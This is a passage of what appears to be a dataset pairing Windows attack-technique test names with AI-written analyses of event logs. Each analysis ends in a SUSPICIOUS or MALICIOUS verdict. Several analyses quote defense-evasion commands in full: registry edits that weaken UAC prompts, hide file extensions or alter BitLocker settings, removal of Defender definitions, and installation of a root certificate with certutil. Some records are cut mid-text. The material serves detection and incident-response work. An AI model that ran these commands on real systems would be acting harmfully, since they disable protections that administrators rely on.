Additional forensic analysis or sandbox testing of suspicious files can be performed to confirm or rule out malicious indicators."
Windows Powershell Logging Disabled,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Cmd.exe Execution with Registry Modifications:**
    - At `2024-10-24 16:08:50.4280673`, `cmd.exe` was executed with a command line intended to modify the registry settings related to PowerShell logging. This includes:
      - Disabling Module Logging.
      - Disabling Script Block Logging.
      - Disabling Transcription Logging.
      - Disabling script execution.
    - The execution of `cmd.exe` to alter registry settings related to PowerShell logging is suspicious as it seeks to disable the ability to log PowerShell activities and may be indicative of an attempt to obfuscate malicious activity.

2. **Process Execution Patterns:**
    - Following the `cmd.exe` operation, there are multiple executions of `reg.exe` intended to perform registry-specific tasks as mentioned in the command line.
    - These activities have been performed by the same user, `SERVER002\admin_test`, which could suggest either an automation script exploiting registry or an attacker manually disabling security auditing.
    
3. **Wevtutil.exe Execution:**
    - There are multiple executions of `wevtutil.exe` observed in the logs (`EventID 5`) by the same user. While `wevtutil.exe` is a legitimate Windows tool used for managing event logs, frequent and unsanctioned use may be a tactic for log clearing or event log manipulation, possibly to hide traces of unauthorized activities.

4. **Time Changes in Security and System Logs:**
    - A time change event (`EventID 4616` in Security logs and `EventID 1` in System logs) was recorded, indicating that the system time was adjusted backward just slightly. This could be benign, or it could serve as an internal mechanism to backdate logs and hinder correct chronological analysis.

5. **Massive Microsoft Edge Update Events:**
    - A series of events related to Microsoft Edge Update processes (like `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup.exe`) are recorded. While these might symbolize a regular update process, the use of temp directories and frequent launches can seem atypical, especially given the timing with suspicious PowerShell and registry changes.

### Indicators of Compromise or Malicious Activity:
- The alteration of PowerShell policies in registry settings combined with the execution pattern of legitimate tools for potentially obfuscating activities signifies suspicious behavior.
  
### Assessment:
Given the identified anomalies and potential obfuscation methods seen in the logs, the activity stands out as suspicious and warrants a deeper investigation.

### Resolution:
- **SUSPICIOUS**

### Recommendations:
- **Further Analysis:**
  - Conduct a thorough check on user `SERVER002\admin_test` for any anomalous accounts or permissions.
  - Investigate the origin of the `cmd.exe` and `reg.exe` executions to ensure they align with regular maintenance tasks.
  - Examine any related network traffic during the logged period for exfiltration or communication with known bad IPs.
  
- **Systems Audit:**
  - Perform a comprehensive audit of PowerShell logging settings and validate them against company policies.
  - Ensure time synchronization settings are accurate across all machines to mitigate unauthorized time adjustments.

- **Mitigation:**
  - Reinforce security settings and monitoring around PowerShell executions and potentially troubling registry modifications.
  - Consider using a tool like Microsoft Defender for Endpoint for advanced detection of suspicious activities and automated threat response.

The recommended investigation should determine if these events are the result of an authorized sequence of actions or indicate compromised activity."
Tamper with Windows Defender Registry,"**Detailed Analysis of the Logs:**

1. **Sysmon Logs:**
   - The Sysmon logs predominantly show process creations and terminations related to normal system updates by Microsoft Edge Update. EdgeUpdate is a legitimate process responsible for updating Microsoft Edge browser.
   - However, a notable entry is the execution of PowerShell with a command (`Set-ItemProperty`) to modify the registry key to disable Windows Defender's real-time protection. This action is highly suspicious as it is often used by attackers to gain persistence or to prevent detection by disabling the system's antivirus protection.

2. **PowerShell Logs:**
   - The PowerShell logs confirm that a PowerShell script was executed to disable the AntiSpyware feature in Windows Defender. The command was run at a high integrity level by the user 'SERVER002\admin_test'.

3. **Application Logs:**
   - The application logs show normal service stop logs related to the Edge Update. There is no suspicious behavior directly observed in this log.

4. **Lack of Security Log Entries:**
   - Absence of relevant security event logs makes it difficult to correlate account or system changes, which are essential in establishing the context or intent of activities observed in Sysmon and PowerShell logs.

**Assessment of the Situation:**
- The PowerShell command to modify critical system settings (disabling Windows Defender) without a clear business or operational reason is indicative of potentially malicious intent. This action aligns with tactics commonly used in malware attacks to evade detection.
- While other processes in the logs appear to be related to legitimate Edge updates, the action involving the registry modification stands out as a significant security risk.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Investigate the user account 'SERVER002\admin_test' to verify its legitimacy and check for any unusual recent activities.
   - Check the system for other signs of compromise, such as unauthorized user accounts, changes to system settings, or presence of unfamiliar files.
   - Re-enable Windows Defender and ensure that its policies have not been tampered with across other systems.

2. **Further Investigation:**
   - Conduct a thorough system audit to ensure no other unauthorized changes have been made.
   - Review additional security/log data from network devices and other endpoints for related suspicious activities.
   - Utilize a robust endpoint detection and response (EDR) tool to detect any other threats or unauthorized processes.

3. **Strengthen Security Posture:**
   - Implement stricter PowerShell script policies and logging to detect potentially harmful scripts earlier.
   - Educate users on security best practices to prevent exploitation via social engineering or phishing attacks.

Taking these steps will help mitigate the risk and better secure the environment against similar unauthorized activities."
UEFI Persistence via Wpbbin.exe File Creation,"Based on the provided logs, let's conduct a detailed analysis:

**Suspicious or Anomalous Behavior:**

1. **Time Manipulation**: Several events were logged showing time manipulation on the system:
   - Event from Security log (EventID: 4616): The system time is set backwards from ""2024-10-27 12:41:44.3838027"" to ""2024-10-27 12:41:37.6118793"".
   - System log (EventID: 1) also indicates time was set back within the same second.

   This action is suspicious, as changing system time could be an attempt to evade logging or confuse log analysis timelines.

2. **PowerShell Activity**: There is a PowerShell command executed to create a file in the system's directory:
   - PowerShell log shows a command executed to create `%systemroot%\wpbbin.exe`.
   - Sysmon logs show the execution of ""powershell.exe"" with suspicious activity of file creation.

   The creation of executable files using PowerShell with high integrity privileges can potentially indicate malicious activity, especially when creating hidden or obscure files.

3. **Usage of Sensitive Privileges**: 
   - Security log (EventID: 4672) indicates admin_test has several high-security privileges (SeDebugPrivilege, SeBackupPrivilege, etc.) which can be exploited for lateral movement or privilege escalation.

4. **Commands Executed**: Several command-line utilities such as `whoami.exe`, `hostname.exe`, and `conhost.exe` were executed, which could be part of an enumeration process commonly used in penetration testing or attacks.

**Assessment:**

The combination of system time manipulation, suspicious PowerShell commands, and sensitive privilege assignments suggest that there might be an attempt at evasive or preparatory actions consistent with malicious behavior. The PowerShell execution specifically stands out due to the creation of an executable file in critical system directories.

**Resolution: SUSPICIOUS**

This activity warrants further investigation; however, it is not conclusively malicious from the logs alone. Additional context and checks are needed:
- Verify if there were any authorized maintenance or scripts running at that time.
- Investigate the newly created file (`wpbbin.exe`) for any signs of malware or unauthorized software.
- Review other logs or configurations for signs of compromise or unauthorized access, particularly focusing on any unexpected use of admin_test privileges.
- Check for any scheduled tasks, startups, or services that may indicate persistence mechanisms.

**Guidance on How to Proceed:**

1. Investigate the purpose and origin of the PowerShell command that created the file.
2. Conduct a forensic analysis of `wpbbin.exe` if it was created, storing any findings securely for future reference.
3. Review user activity and access logs for the `admin_test` account to verify any aberrant behavior.
4. If possible, conduct a thorough examination of related hosts and network traffic around the timestamp of these suspicious actions for lateral movement or data exfiltration signs."
DLL Search Order Hijacking - amsi.dll,"Upon reviewing the provided event logs, here's a detailed analysis focusing on any signs of suspicious or malicious activity:

### Windows PowerShell Log Analysis
- **Events 1043 to 1050**: These events indicate that a PowerShell session was initiated with the host application as `C:\\Users\\admin_test\\AppData\\Roaming\\updater.exe -Command exit`. This use of `updater.exe` as a PowerShell host application raises suspicion. `updater.exe` might be masquerading or acting as a dropper for initiating malicious scripts. Copying and executing a script under `AppData\\Roaming` is a common technique used by malware to evade detection.

### Security Log Analysis
- **Events 30368 and 30369**: These events show time changes, probably due to synchronization but conducted under the `svchost.exe` process with `LOCAL SERVICE` privileges. Normally, these operations should not raise suspicion unless they are abnormal or unauthorized.

### Application Log Analysis
- There are entries regarding the Software Protection Platform Service and Edge Update processes. The `Service stopped` event for edgeupdate is typical of application updates and maintenance tasks.

### System Log Analysis
- **Events show time synchronization**: It's consistent with time service adjustments, likely benign in the context shown here, providing no additional evidence of compromise through the system logs.

### Sysmon Log Analysis
- **Potentially Suspicious Activity**:
  - **Event 17987**: The execution of `cmd.exe` using a command line with a copy operation to duplicate `powershell.exe` to `updater.exe` under the `%APPDATA%` directory is particularly suspicious. This behavior is indicative of process replacement or evasion tactics. The admission of `amsi.dll` copy manipulation is associated with attempts to disable AMSI (Antimalware Scan Interface), a known adversarial tactic.
  - **Event 17989**: The execution of the potentially malicious `updater.exe` with PowerShell behavior is consistent with the PowerShell log entries and could indicate malware execution, possibly part of a persistence mechanism or payload delivery.
- **Microsoft Edge Update Processes (Events 17998, 18000, 18001, 18002)**: Execution of Edge update processes under `SYSTEM` authority is standard for legitimate application updates, generally not immediately suspicious without anomalous behavior or context.

### Assessment & Conclusion

#### Indicators of Potential Malicious Activity:
1. **Use of `updater.exe` as a PowerShell Host Application**: Highly suspect and indicative of possible process injection or malicious script execution.
2. **Command Line Execution via `cmd.exe`**: Shows potential for mimicry of legitimate processes with `powershell.exe` duplication and AMSI manipulation.

#### Threats/Risks Identified:
- A potential compromise of the host, particularly indicating the presence of malware attempting to execute and persist by disguising itself as legitimate software and bypassing security checks.

  7. **Notify IT Security Team**: Report the findings to your IT security team's incident response for further investigation and to determine if notifications to higher management or cyber-security response units are necessary.
  
These measures will help ascertain the extent of the activity and mitigate any potential threat effectively."
UACME Bypass Method 33,"Upon analyzing the provided logs, here are the key observations:

1. **Initial Analysis:**
   - The logs are filled with typical system operations and application updates.
   - The logs do not show any abnormal spikes in the number of logons, unexpected logon attempts, or privilege escalations beyond standard operations.

2. **Specific Events of Interest:**
   - **Sysmon Logs:**
     - Observed a process `Akagi64.exe` executed from `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\uacme\\`. 
     - This file path and process name might indicate the usage of a well-known User Account Control (UAC) bypass tool.
     - There are multiple executions involving `cmd.exe`, `powershell.exe`, and legitimate system updates and tasks. The usage of `cmd.exe` and `PowerShell` scripts involves potentially checking or executing files which might be typical for an admin, but can also be indicative of malicious activity depending on context.
   
   - **Security Logs:**
     - Frequent user enumeration for various user accounts. Though this can sometimes be normal when associated with system tasks, it is worth noting that it coincides with the suspicious `Akagi64.exe` execution.

3. **Malicious Indicators:**
   - **Akagi64.exe** - This might be a payload or a sign of UAC bypass attempt, which often necessitates deeper investigation due to its association with unauthorized privilege escalation attempts.

4. **Contextual Analysis:**
   - The logs are dense with legitimate system and service operations, including `EdgeUpdate` and `Windows Defender` activities. These by themselves don't raise alerts.
   - However, the presence of the `Akagi64.exe` process associated with a potential UAC bypass tool does warrant suspicion.

Based on these observations, the logs contain activity that is not outright malicious but does raise sufficient suspicions that further investigation is required—specifically into the execution of `Akagi64.exe` from suspicious directories which could involve unauthorized activity.

**Resolution: SUSPICIOUS**

**Guidance:**
- Investigate the context and intent of the `Akagi64.exe` execution, determine its origin, and validate its necessity.
- Check for any resulting changes or actions taken during or after the execution of this suspicious file.
- Review user permissions and access logs to determine if there was unauthorized privilege escalation or data access.
- Consider tools like Antivirus scans, Integrity Verification, and detailed threat hunting for potential indicators of compromise related to this finding."
Disable Windows Security Center Notifications,"Upon reviewing the provided log entries, several key points stand out that suggest suspicious and potentially malicious activities:

1. **Frequent Execution of wevtutil.exe and conhost.exe:**
   - Logs show multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`.
   - `wevtutil.exe` is a legitimate Windows utility used to read and manage event logs. Its repeated execution could imply log tampering activities.
   - `conhost.exe` (Console Host) is used by the system when console-based applications are run. The frequent appearance of this process following `wevtutil.exe` might indicate attempts to cover tracks or redirect outputs.

2. **Unix-style Commands and SystemEnumeration:**
   - The execution of `hostname.exe` and `whoami.exe` suggests system enumeration activity, often symptomatic of an attacker trying to gather information about the environment.
   - These commands are typical of both legitimate administration work and reconnaissance efforts in a breach.

3. **Registry Modification via cmd.exe:**
   - The execution of `cmd.exe` used to run a registry modification command (`reg add`) is of particular concern as it changes the configuration of Windows' Action Center Experience.
   - Registry changes like this could signal attempts to persist within the system or alter system behavior for further exploitation.
   
4. **Logon Events with High Privileges:**
   - Security logs show a `4624` logon event with elevating privileges (`4672`). The privileges include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, among others, which are powerful and potentially dangerous if misused.
   - The use of `NTLM` authentication points to a possible use of a less secure protocol, which might be exploited in certain attack vectors.

**Assessment and Recommendation:**

- **Suspicious**: The combination of these activities—unusual process execution, possible log tampering, registry modifications, and privileged logon—suggests a pattern consistent with suspicious behavior that requires further investigation.
  
**Guidance for Proceeding:**
- Initiate a more in-depth analysis of user `admin_test` activities, checking for anomalies in usage patterns.
- Verify the source and legitimacy of commands run under `wevtutil.exe, hostname.exe,` and `whoami.exe`.
- Conduct forensic analysis of any modified registry keys and evaluate logs for any further tampering.
- Audit and possibly enhance security protocols around NTLM usage.
- Consider monitoring this system more closely for any new or continued suspicious activities."
Remove Windows Defender Definition Files,"Upon reviewing the provided set of logs, here is a detailed analysis focusing on any suspicious or anomalous behavior indicative of potential malicious activity.

### Application Log Analysis
- All entries originate from the ""SecurityCenter"" provider and indicate the state of Windows Defender as ""SECURITY_PRODUCT_STATE_ON"". There is also an entry from the ""Software Protection Platform Service"" related to the ""RulesEngine"". This confirms that Windows Defender appears to be running normally, without any indication of being disabled or compromised in these logs.

### Sysmon Log Analysis
- Numerous entries involve the execution of the `wevtutil.exe` and `conhost.exe` processes by the user account ""SERVER002\\admin_test"". The `wevtutil.exe` tool is typically used for managing Windows Event Logs and can be used maliciously to clear logs or gather detailed system information.
- The consistent use of the `conhost.exe` processes accompanying each `wevtutil.exe` invocation is indeed peculiar, highlighting potentially automated or scripted behavior.
- The execution of `whoami.exe`, `hostname.exe`, and `cmd.exe` followed by `MpCmdRun.exe` with `-RemoveDefinitions -All` indicates attempts to use command-line utilities to gather user information or tamper with the system (specifically, removing definitions in Windows Defender). This behavior could be indicative of an attempt to disable or remove security protections temporarily.
- The logs show high integrity levels during these processes' execution, suggesting elevated privileges, likely performed under an administrator account.
- While `wevtutil.exe`, `whoami.exe`, `hostname.exe`, and `cmd.exe` can be used legitimately, their execution in sequence, especially with the commands used here, points towards potential misuse or compromise.
  
### System Log Analysis
- There is a Kernel-General log mentioning an update to the registry hive `\??\C:\Windows\system32\config\ELAM`. Early Launch Anti-Malware (ELAM) protects the system from early booting malware; changes here without accompanying details could suggest attempts to disable or interfere with anti-malware mechanisms.

### Final Assessment
There is notable suspicious behavior present within the logs, primarily concerning the execution of various Windows system utilities and command-line tools in a manner typical of post-exploitation activities—especially due to the sequence of disabling Windows Defender definitions. Activities like removing Defender definitions are highly unusual for any benign applications and can be a part of an attacker’s efforts to disable security measures temporarily.

### Recommended Resolution: **SUSPICIOUS**
These logs reflect potentially suspicious activity that needs further investigation. If this activity was not initiated by an authorized script or maintenance operation, it could indicate malicious attempts to conduct reconnaissance and disable protection measures on the host. Immediate steps should include verifying these actions with system administrators, reviewing other related logs for confirmation, and ensuring Windows Defender and other security measures are fully operational and updated."
Install root CA on Windows with certutil,"Upon review of the provided Windows event logs, several items of potential interest have been identified, specifically regarding the use of PowerShell and certutil.exe. Here are the key findings:

1. **PowerShell Usage:**
   - There are logs indicating the execution of PowerShell with a command that runs CertUtil to add a certificate to the store: `certutil -addstore my $env:Temp\\rootCA2.cer`. This could be a legitimate administrative action, but it can also be indicative of a tactic used by attackers to install malicious certificates or to facilitate man-in-the-middle attacks.

2. **CertUtil Usage:**
   - CertUtil is being used in conjunction with PowerShell to add certificates, which is often flagged as suspicious behavior. The specific command noted is: `""C:\\Windows\\system32\\certutil.exe"" -addstore my C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\rootCA2.cer`.

3. **High-Level Integrity and User Context:**
   - These actions are being executed under a high integrity level and by the user ""SERVER002\\admin_test"", suggesting administrative privileges. This user context is consistent throughout the Windows PowerShell log entries, pointing to potentially privileged operations.

4. **No Direct Evidence of Malicious Actions:**
   - While there are indicators that can be associated with malicious activity, such as using PowerShell with certutil, there is no explicit evidence or log entries clearly indicating a compromise or successful malicious action (e.g., files being altered or exfiltrated, unexpected network activity, or unauthorized access).

**Assessment and Risk:**
Given the use of PowerShell and certutil in the context provided, the behavior recorded in these logs is categorized as:

- **SUSPICIOUS**: There is enough unusual activity that warrants further investigation to rule out potential malicious intent. The activities could be a result of legitimate administrative tasks but should not be dismissed without verifying the context and necessity of these actions.

**Guidance:**
1. **Confirm Legitimacy:**
   - Investigate whether the PowerShell and certutil commands were part of scheduled administrative operations or a known configuration change.

2. **Review User Activity:**
   - Look into the user account 'SERVER002\\admin_test' and check recent activities to ensure there is no unauthorized access or activity.

3. **Monitor Systems:**
   - Implement enhanced monitoring on this host to detect any further suspicious activity.

4. **Conduct a Security Audit:**
   - It may be prudent to perform a comprehensive audit of user permissions, especially for accounts with administrative privileges.

Based on the current logs alone, it is difficult to definitively determine malicious activity, but further investigation is warranted given the potential for abuse of these techniques."

- The system logs show regular time synchronization events and kernel general activities. This is routine and typically benign.
  
#### Security Log:
- The security log shows a series of Event ID 4616, which indicates a change in the system time. This action is logged as occurring via `svchost.exe`, running under `LOCAL SERVICE`. 
- The change in system time appears as an administrative action to adjust minor inaccuracies, which isn't uncommon. However, persistent and unexplained time changes can be suspicious.

#### PowerShell Log:
- The PowerShell logs reveal that `powershell.exe` executed a script altering the registry key related to `ConsentPromptBehaviorAdmin`, setting its value to 0. This key adjustment reduces the permission prompt frequency for User Account Control (UAC), potentially facilitating privilege escalation or unauthorized actions.
- The command executed is: 
  ```powershell
  powershell.exe & {$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin
  Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force}
  ```
- This action, if unauthorized, could indicate an attempt to bypass security features.

#### Sysmon Log:
- Several occurrences of the execution of `whoami.exe`, `conhost.exe`, and `wevtutil.exe` are logged. The repeated use of such utilities, specifically under user `admin_test` with a high integrity level, can be suspicious if not part of regular administrative activities.
- `wevtutil.exe` (Windows Event Log Utility) can be used to clear or manage event logs; repeated execution might suggest log tampering attempts.
- `MicrosoftEdgeUpdate.exe` and related processes appear benign if they relate to an update, although these should be verified against expected software behavior.

### Assessment

The logs suggest potentially suspicious behavior due to the unauthorized registry key modification via PowerShell. This change in the UAC configuration could indicate an attempt to soften system defenses, which, combined with processes often involved in privilege management (`whoami`, `conhost`, and `wevtutil`), might suggest the possibility of malicious activity.

### Conclusion

- **Resolution:** **SUSPICIOUS**
- **Guidance:** 
  - Validate the PowerShell script's intent and execution to determine if it was a legitimate administrative action or part of malware activity.
  - Check for any authorized script documentation or operator who might have executed this activity.
  - Examine the context around the use of `wevtutil.exe` and `whoami.exe` for potential log clearing or privilege escalation activities.
  - Consider increased monitoring, especially around registry changes and PowerShell activities, using enhanced auditing measures like AppLocker or PowerShell logging features.
- **Recommendation:** 
  - Conduct further investigation to establish the legitimacy of the registry change and confirm no unauthorized access or persistence mechanisms are at play."
Modify Registry of Current User Profile - cmd,"Upon careful examination of the provided Windows event logs, here's a detailed breakdown and analysis:

### Security Logs
1. **Event ID 4616**: These events indicate changes to system time by the `svchost.exe` process running under the `LOCAL SERVICE` account. 
   - **Analysis**: System time changes can be benign or malicious, depending on context. These changes seem aligned with Windows Time Service synchronization activities, as indicated by other log entries on time synchronization (`EventID 35`).

### Application Logs
1. **Software Protection Platform Service (Event ID 16384)**: Appears to be a regular operation of the Software Protection service.
   - **Analysis**: No suspicious activities detected.

### Sysmon Logs
1. **Event ID 5**: Repeated execution of common Windows utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and `cmd.exe`.
   - **Analysis**: These events could indicate regular administrative tasks or scripted automation processes. Notably, `cmd.exe` executed a command to modify the Windows registry to hide file extensions. While such registry modifications can be legitimate, they may also serve as an evasion technique used by malware or attackers to obscure file types.
   
2. **Event ID 1**: A command was executed using `cmd.exe` with the following command line:
   - `\""cmd.exe\"" /c reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f`
   - **Analysis**: The change to hide file extensions is potentially suspicious if not authorized or intended by the administrator. Furthermore, the execution of `whoami.exe` and `cmd.exe` in close succession is indicative behavior often seen in post-exploitation activities to gather information and change system settings.

### System Logs
1. **Time Synchronization Events (Event ID 24, 1)**: Normal operations related to time adjustments with no signs of tampering or forgery.

### Conclusion
- The logs reflect regular system activities, including a few script-like executions using typical Windows utilities.
- There is a notable registry change command that alters user settings, which could be benign, but in some contexts might indicate malicious intent, especially if unexpected.
  
### Assessment
- **Resolution**: **SUSPICIOUS**
- **Recommendation**: Further investigation is needed to determine if the registry modification was conducted by an authorized administrative process or if it is an unauthorized change. Review any scheduled tasks, scripts, or recently accessed files, and consider scanning for malware to provide full assurance of system integrity.

Consider querying users or stakeholders for any recent changes authorized in system settings or software installations that might correlate with these logs."
Renamed Microsoft.Workflow.Compiler.exe Payload Executions,"Upon reviewing the provided logs, a deeper analysis reveals several points of interest that warrant further attention:

1. **PowerShell Execution with Unusual Arguments**:
   - The PowerShell log entries indicate execution of a script using `powershell.exe` with a command referencing an obfuscated path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\svchost.exe`. This path is atypical and references an executable named `svchost.exe`, which normally resides in system directories but appears in an unusual location here, indicating potential masquerading or insertion of a malicious executable.

2. **Unhandled Exception and Image Load in Application Log**:
   - The application log shows an `svchost.exe` version 4.8.9037.0 terminated due to an unhandled exception originating from `System.IO.DirectoryNotFoundException`. This version mismatch and path typically indicates a non-standard or malicious attempt to mimic the legitimate `svchost.exe` functionality.

3. **Security Log - Privilege Use and Failed Credential Requests**:
   - The Security log outlines a logon session with the ID `0x13C0BD` for the user `admin_test`. This session attempted credential reading operations which failed with return codes indicating errors or denials (`ReturnCode=3221225567`). It is notable that when `SYSTEM` logs in (EventID 4672), multiple privileges were invoked, including potentially dangerous ones like `SeDebugPrivilege`.

4. **Sysmon Logs - Image Execution**:
   - Sysmon records file executions related to `Microsoft.Workflow.Compiler.exe` under the guise of `svchost.exe` with execution arguments indicating script compilation or processing tasks. The image parentage from `wsmprovhost.exe` aligns with potential misuse of legitimate Windows processes for execution of scripts or commands.

5. **Indicators of Process Injection or Malware Staging**:
   - The presence of `WerFault.exe` being invoked following execution of `svchost.exe` in the application logs hints at error reporting possibly being triggered as a side effect of malware operation or conflict, aligning with exceptionally timed `Windows Error Reporting` entries.

Based on this analysis and correlating the observed behaviors such as unusual PowerShell executions, privilege misuse, failed credential accesses, and error-prone operations, the following assessment is provided:

**Assessment and Resolution: SUSPICIOUS**

Given the findings, there's sufficient suspicion to warrant further investigation. The activities identified do not confidently mark the presence of active malware but strongly suggest abnormal operations that deviate from typical use cases. Immediate steps include:
- Conduct an in-depth forensic analysis of the `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\svchost.exe` path and its contents.
- Isolate the host and scan for known vulnerabilities or exploit patterns aligning with observed behaviors.
- Validate current up-to-dateness of antivirus/malware databases and consider third-party tools for in-depth malware analysis.
- Cross-reference findings with threat intelligence databases for any matching indicators of compromise (IoCs).

Continuing this vigilant approach should aid in identifying whether any objects or processes may compromise system integrity and lead to actions appropriate for containment and remediation."
Masquerading - non-windows exe running as windows exe,"After thoroughly reviewing the provided Windows event logs across different channels (PowerShell, Security, Application, System, and Sysmon), several points stand out indicating potentially malicious activity:

1. **PowerShell Activity:**
   - The PowerShell logs show a script execution that involves copying an executable `data.003.exe` from a temporary directory to another file named `svchost.exe` and then starting and immediately stopping the process. This behavior is suspicious because:
     - The use of svchost.exe as a destination and execution target is a well-known tactic for camouflage in malicious activities.
     - The script attempts to start the copied executable, captures the process ID, and subsequently ends it, which can be indicative of attempting to execute something briefly before detection measures can observe it.
   - Encoding and variable referencing within the script suggests potential attempts at obfuscation.

2. **Security Log Events:**
   - Multiple EventID 5379 entries indicate credential manager operations that failed (ReturnCode=""3221226021""). While these failed operations could occur under normal circumstances, in conjunction with the other suspicious activities, they warrant further inspection.
   - An EventID 4624 (indicating a successful logon) followed by EventID 4672 (indicating special privileges for SYSTEM) may suggest patterns typical of privilege escalation attempts.

3. **Sysmon Log:**
   - The Sysmon logs provide further evidence of the execution of the suspicious PowerShell script. The parent-child process relationships indicate that PowerShell was started via `wsmprovhost.exe`, another common tactic to obscure the origin of execution.
   - The logged events reveal the creation and ingestion of various Windows utilities and processes. However, the presence and use of `whoami.exe`, `wevtutil.exe`, and `conhost.exe` in quick succession further add layers of suspicion in the background of potentially illegitimate activities.
   - Detection of an unexpected svchost.exe process initiated by a non-standard chain of events lends additional weight to concerns about misuse.

**Overall Assessment:**
Based on the observed activities specifically around the PowerShell script execution, potentially obfuscated code operation to execute unusual binaries, and the surrounding Sysmon logs showing non-standard process creations, the logs contain indicators of potential malicious behavior.

**Resolution: MALICIOUS**

**Guidance:**
1. **Immediate Actions:**
   - Isolate ""Server002"" from the network to prevent any potential spread or communication of malicious software.
   - Conduct deeper forensic analysis on the host to identify the full impact and origin of the script `data.003.exe`.
   - Compare hashes of involved files (like `svchost.exe` from TEMP directory) with known malicious signatures.
   - Review and enhance endpoint detection systems to recognize this and similar patterns.

2. **Post-Incident Recovery:**
   - After ensuring containment and eradication, review system logs for similar artifacts.
   - Develop and apply more stringent monitoring of PowerShell activities and anomaly detection on the network.

3. **Preventive Measures:**
   - Educate staff on suspicious indicators from system behaviors, and ensure regular updates on known tactics, techniques, and procedures (TTPs) used by adversaries.
   - Review and limit permissions and the potential for privilege escalations where possible."
Modify UseTPM Registry entry,"After a careful analysis of the provided Windows event logs, including the application, sysmon, and other system logs for Server002, I have identified the following points:

1. **Edge Update Activities:**
   - The logs reveal numerous process creations related to `Microsoft Edge Update`, which appear consistent with legitimate software update activities. These include processes like `MicrosoftEdgeUpdateSetup.exe`, `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, etc., all signed by Microsoft Corporation. The command lines used in these processes seem typical for updating or registering processes and services associated with Edge.

2. **Process Monitoring with Sysmon:**
   - Several Sysmon logs capture the execution of system utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. These utilities can be used for system configuration checks or log management.
   - Activities around `whoami.exe`, `cmd.exe`, and `reg.exe` raise mild suspicion due to their capability to alter system configurations or query user information. Notably, `cmd.exe` executed a registry command to add a key under ""HKLM\SOFTWARE\Policies\Microsoft\FVE"", which appears to modify BitLocker-related settings (UseTPM). However, without further context from security policies or endpoint protection logs, it is not conclusive evidence of malicious activity.

3. **Unusual Command Lines and Registry Modifications:**
   - The command execution observed with `cmd.exe` involves registry modifications, indicating administrative-level operations. This could be legitimate under scheduled tasks or administrative scripts, but absent details make it necessary to verify if this is expected behavior on the observed host.

4. **Security and Network Service Activities:**
   - Activities involving `sppsvc.exe` (Software Protection Platform Service) are noted; however, they seem routine in the context of ensuring software licensing integrity associated with Microsoft products.

Based on the analysis of these logs, the activities do not exhibit definitive characteristics of malware or unauthorized access but do include operations that could potentially be leveraged in nefarious contexts if not monitored correctly. 

**Resolution: SUSPICIOUS**

**Recommendations:**
- **Further Investigation:** Verify if the registry changes align with organizational policy and check if the account ""admin_test"" performing these actions has a legitimate purpose.
- **Audit Logs and Network Policies:** Review security baselines for policy changes and ensure monitoring rules are in place to catch any unauthorized registry edits or `cmd.exe` command executions.
- **User Training:** Reinforce user training for spotting suspicious activities and understanding their roles in protecting system integrity.

Conclusively, while no explicit malicious behavior is immediately identifiable, the actions noted warrant further scrutiny to ensure the integrity of the host within your security framework."
Disable UAC - Switch to the secure desktop when prompting for elevation via registry key,"Upon analyzing the provided Windows event logs, several important observations can be made regarding potential malicious activity:

1. **PowerShell Activity**:
   - The logs indicate the use of PowerShell with a command intended to modify a registry key: `Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force`.
   - Changing the ""PromptOnSecureDesktop"" value disables the Secure Desktop for User Account Control (UAC) prompts, which can potentially be used by malicious actors to bypass UAC and execute commands with elevated privileges without user confirmation.
   - This kind of activity is unusual and warrants further investigation since legitimate use cases for altering UAC behavior are rare in a regular operational environment.

2. **Sysmon Activity**:
   - The logs show multiple instances of processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` running with the user `SERVER002\admin_test`, which might suggest a script or sequence being executed.
   - Notably, the PowerShell execution aligns with the action observed in the PowerShell logs and indicates a high integrity level, meaning it was executed with administrative privileges.
   - The continued execution of `MicrosoftEdgeUpdate.exe` with different command-line options suggests an update or installation process, which appears legit given the absence of an unusual file path or unexpected activity linked to Edge updates.

3. **Legitimate Updates and Services**:
   - Observations of Microsoft Edge Update activity, including installations and updates, appear in the logs. This activity predominantly involves `MicrosoftEdgeUpdate.exe`, which shows product-specific updates and actions that seem consistent with benign application maintenance or updates.
   - Similarly, processes such as `svchost.exe`, `wbem\WmiPrvSE.exe`, and `TrustedInstaller.exe` running under `NT AUTHORITY\SYSTEM` are typical and often relate to system maintenance.

**Assessment and Findings**:
- **Suspicious**: The activity altering the registry key involving ""PromptOnSecureDesktop"" is a key indicator of potentially malicious actions aimed at privilege escalation or stealthy execution of commands. This behavior is out of place unless intended by IT or system administrators with a documented reason.
- **PowerShell execution** at a high integrity level performing administrative tasks without typical justifications might suggest unauthorized actions.

**Guidance**:
- Investigate the execution context of the PowerShell command that altered the UAC behavior: Verify if this was initiated by authorized personnel or a scheduled task.
- Review user account `admin_test` activities and permissions to ensure there is no credential compromise.
- Consider setting up audit policies and forward rules to capture similar registry and PowerShell activities in the future.
- Run endpoint detection and response (EDR) tools to search for potential persistence mechanisms and ensure the system's integrity.

**Resolution**: **SUSPICIOUS** - There is suspicious activity that needs further investigation to rule out malicious intent."
